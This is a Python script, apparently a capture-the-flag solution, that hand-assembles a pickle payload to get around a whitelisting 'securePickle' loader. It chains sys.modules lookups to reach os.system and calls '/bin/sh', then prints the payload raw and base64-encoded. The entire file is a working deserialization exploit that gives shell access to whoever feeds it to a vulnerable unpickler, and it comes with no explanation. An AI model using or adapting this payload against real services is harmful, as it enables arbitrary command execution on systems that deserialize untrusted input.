#!/usr/bin/env python3
import pickle
import securePickle as pickle2
import base64

pickle2.whitelist.append('sys')


def push_global(module, name):
    return pickle.GLOBAL + module + b'\n' + name + b'\n'


def push_put(index):
    return pickle.PUT + str(index).encode() + b'\n'


def push_tuple(items):
    return pickle.MARK + b''.join(items) + pickle.TUPLE


def push_int(value):
    return pickle.INT + str(value).encode() + b'\n'


def push_reduce(f, args):
    return f + push_tuple(args) + pickle.REDUCE


def push_get(index):
    return pickle.GET + str(index).encode() + b'\n'


def push_string(s):
    return pickle.STRING + b'"' + s + b'"\n'


def push_setitem(d, k, v):
    return d + k + v + pickle.SETITEM


def push_getattr(obj, name):
    return push_setitem(
        push_get(0),
        push_string(b'sys'),
        obj,
    ) + push_global(b'sys', name) + push_put(1) + pickle.POP + pickle.POP + push_get(1)


canon = b''.join([
    push_global(b'sys', b'modules'),
    push_put(0),
    pickle.POP,
    push_reduce(
        push_getattr(
            push_reduce(
                push_getattr(
                    push_get(0),
                    b'__getitem__',
                ),
                [push_string(b'os')],
            ),
            b'system',
        ),
        [push_string(b'/bin/sh')],
    ),
    pickle.STOP,
])
print(canon)
print(base64.b64encode(canon))
